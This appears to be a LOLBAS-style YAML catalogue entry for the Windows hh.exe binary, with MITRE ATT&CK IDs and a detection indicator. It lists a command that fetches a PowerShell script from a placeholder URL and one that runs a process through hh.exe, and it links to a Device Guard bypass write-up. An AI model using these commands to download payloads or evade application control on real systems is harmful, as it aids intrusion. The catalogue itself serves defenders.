---
Name: Hh.exe
Description: Binary used for processing chm files in Windows
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: HH.exe http://some.url/script.ps1
    Description: Open the target PowerShell script with HTML Help.
    Usecase: Download files from url
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: HH.exe c:\windows\system32\calc.exe
    Description: Executes calc.exe with HTML Help.
    Usecase: Execute process with HH.exe
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\hh.exe
  - Path: C:\Windows\SysWOW64\hh.exe
Code_Sample:
- Code:
Detection:
 - IOC: hh.exe should normally not be in use on a normal workstation
Resources:
  - Link: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
